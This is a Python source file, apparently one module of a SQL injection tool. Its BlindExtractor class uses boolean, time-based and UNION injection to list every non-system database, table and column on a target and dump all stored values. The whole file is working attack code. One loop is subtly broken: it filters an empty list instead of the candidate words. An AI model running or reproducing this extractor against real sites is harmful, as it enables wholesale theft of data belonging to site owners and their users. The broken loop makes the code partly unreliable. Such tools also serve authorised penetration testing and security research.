from re import findall

from injections.BooleanInjector import BooleanInjector
from injections.TimeInjector import TimeInjector
from injections.UnionInjector import UnionInjector
from utils.constants import (
    HEIGH_COL_VALUE_LENGTH,
    HEIGH_ELEMENT_COUNT,
    HEIGH_ELEMENT_NAME_LENGTH,
    RESET,
    YELLOW,
    InjectionContext,
)
from utils.Logger import Logger
from utils.parser import is_system_db
from utils.print import string_to_sql_char


class BlindExtractor:
    def __init__(
        self,
        time: TimeInjector,
        boolean: BooleanInjector,
        union: UnionInjector,
    ):
        self.time = time
        self.boolean = boolean
        self.union = union

    def find_words(self, body: str, start: str, end: str, length: int) -> list[str]:
        """Find words corresponding to a Regex in a given text"""
        pattern = rf"\b{start}\w{{{length - 2}}}{end}\b"
        return findall(pattern, body)

    def find_db_elem_name(
        self,
        url: str,
        param: str,
        ctx: InjectionContext,
        column_count: int,
        boolInjection: bool,
        db_elem: str,
        expression: str,
        union_expression: str,
    ) -> str:
        """
        Compute a database element's name
        """

        get_chars = (
            self.boolean.get_db_elem_name_chars_at_index
            if boolInjection
            else self.time.get_db_elem_name_chars_at_index
        )

        get_chars_at_index = (
            self.boolean.get_number_returned_by_sql
            if boolInjection
            else self.time.get_number_returned_by_sql
        )

        get_name = (
            self.boolean.get_db_elem_name
            if boolInjection
            else self.time.get_db_elem_name
        )

        # Test if we can get the element's name included in the injection's response body
        body_containing_name = self.union.test_expressions_name(
            url, param, ctx, union_expression, column_count
        )

        # Get the database element's name length
        name_length_expression = f"LENGTH({expression})"
        max_length = (
            HEIGH_COL_VALUE_LENGTH if db_elem == "value" else HEIGH_ELEMENT_NAME_LENGTH
        )

        name_length = get_chars_at_index(
            url, param, ctx, name_length_expression, max_length
        )

        Logger.debug(
            f"Found database element's name length: {YELLOW}{name_length}{RESET}"
        )

        # Better simply compute for each character if length is short
        if name_length < 5:
            return get_name(url, param, ctx, expression, name_length)

        if body_containing_name:
            # Find the first and the last character in the database element's name
            first_last_chars = get_chars(url, param, ctx, expression, [1, name_length])

            Logger.debug(
                f"First char: {first_last_chars[0]}, last char: {first_last_chars[1]}"
            )

            # Look for words in the response body that has the right length and first/last char
            words = self.find_words(
                body_containing_name,
                first_last_chars[0],
                first_last_chars[1],
                name_length,
            )

            if words:
                Logger.debug(
                    f"Found words in the body with the right length and starting/ending characters:\n{words}\n"
                )

                # If we only have one result we return it
                length = len(words)
                if length == 1:
                    return words[0]

                elif length > 1:
                    corresponding_names: list[str] = []

                    second_and_one_before_last_chars = get_chars(
                        url, param, ctx, expression, [2, name_length - 1]
                    )

                    Logger.debug(
                        f"Second char: {second_and_one_before_last_chars[0]}, "
                        f"one before last char: {second_and_one_before_last_chars[1]}"
                    )

                    for name in corresponding_names:
                        if (
                            name[1] == second_and_one_before_last_chars[0]
                            and name[name_length - 2]
                            == second_and_one_before_last_chars[1]
                        ):
                            corresponding_names.append(name)

                    # If we only have one result we return it
                    if len(corresponding_names) == 1:
                        return corresponding_names[0]
                    # Compute each character to find out the whole name

        return get_name(url, param, ctx, expression, name_length)

    def dump_db_elem_entries(
        self,
        url: str,
        param: str,
        ctx: InjectionContext,
        column_count: int,
        nulls: str,
        boolInjection: bool,
        db_elem: str,
        select: str,
        frm: str,
        where: str,
    ) -> list[str]:
        """
        Get the number of entries that the database element (table, column) has,
        then create a loop in which each entry name is found by binary search.
        All entry names are finally returned as a list.
        """
        results = []

        # Get the number of database element's entries on the database
        db_elem_count_expression = f"(SELECT COUNT(*) {frm} {where})"

        Logger.info(db_elem_count_expression)

        get_number = (
            self.boolean.get_number_returned_by_sql
            if boolInjection
            else self.time.get_number_returned_by_sql
        )

        db_elem_count = get_number(
            url, param, ctx, db_elem_count_expression, HEIGH_ELEMENT_COUNT
        )

        Logger.success(f"Found {db_elem} count: {YELLOW}{db_elem_count}{RESET}")

        # Find name for each database element's entry
        for elem in range(db_elem_count):
            expression = f"({select} {frm} {where} LIMIT {elem},1)"
            # Limit is one further as it prints the first SELECT results at index 0
            union_expression = f"""
                {select},{nulls}
                {frm}
                {where}
                LIMIT {elem + 1},1
            """

            db_elem_name = self.find_db_elem_name(
                url,
                param,
                ctx,
                column_count,
                boolInjection,
                db_elem,
                expression,
                union_expression,
            )
            if db_elem_name:
                results.append(db_elem_name)
                Logger.success(
                    f"Found {db_elem} name #{elem + 1}: {YELLOW}{db_elem_name}{RESET}\n"
                )

        return results

    def dump_db_entries(
        self,
        url: str,
        param: str,
        ctx: InjectionContext,
        column_count: int,
        nulls: str,
        boolInjection: bool,
    ) -> dict:
        """Dump all databases"""

        dump = {}

        """
        Get all database names.
          """

        db_names = self.dump_db_elem_entries(
            url,
            param,
            ctx,
            column_count,
            nulls,
            boolInjection,
            "database",
            "SELECT schema_name",
            "FROM information_schema.schemata",
            "",
        )

        """
        Get the table names of the current database.
        """
        for i, db_name in enumerate(db_names):
            # We ignore databases auto-generated by the system
            if is_system_db(db_name):
                Logger.info(f"Skipping system schema {db_name}...")
            else:
                sql_db_name = string_to_sql_char(db_name)
                dump[db_name] = {}  # create an entry for the current database

                table_names = self.dump_db_elem_entries(
                    url,
                    param,
                    ctx,
                    column_count,
                    nulls,
                    boolInjection,
                    "table",
                    "SELECT table_name",
                    "FROM information_schema.tables",
                    f"WHERE table_schema = {sql_db_name}",
                )

                """
                Get the column names of the current table.
                """

                for table in table_names:
                    dump[db_name][table] = {}

                    sql_table_name = string_to_sql_char(table)
                    column_names = self.dump_db_elem_entries(
                        url,
                        param,
                        ctx,
                        column_count,
                        nulls,
                        boolInjection,
                        "column",
                        "SELECT column_name",
                        "FROM information_schema.columns",
                        f"WHERE table_schema = {sql_db_name} AND table_name = {sql_table_name}",
                    )

                    """
                    Get metadata and values of the current column.
                    """

                    for col in column_names:
                        sql_col_name = string_to_sql_char(col)

                        data_types = self.dump_db_elem_entries(
                            url,
                            param,
                            ctx,
                            column_count,
                            nulls,
                            boolInjection,
                            "value",
                            "SELECT data_type",
                            "FROM information_schema.columns",
                            f"WHERE table_schema = {sql_db_name} "
                            f"AND table_name = {sql_table_name} "
                            f"AND column_name = {sql_col_name}",
                        )

                        character_maximum_lengths = self.dump_db_elem_entries(
                            url,
                            param,
                            ctx,
                            column_count,
                            nulls,
                            boolInjection,
                            "value",
                            "SELECT character_maximum_length",
                            "FROM information_schema.columns",
                            f"WHERE table_schema = {sql_db_name} "
                            f"AND table_name = {sql_table_name} "
                            f"AND column_name = {sql_col_name}",
                        )

                        values = self.dump_db_elem_entries(
                            url,
                            param,
                            ctx,
                            column_count,
                            nulls,
                            boolInjection,
                            "value",
                            f"SELECT `{col}`",
                            f"FROM `{db_name}`.`{table}`",
                            "",
                        )

                        dump[db_name][table][col] = {
                            "data_type": data_types[0] if data_types else None,
                            "character_maximum_length": (
                                character_maximum_lengths[0]
                                if character_maximum_lengths
                                else None
                            ),
                            "values": values,
                        }
        return dump
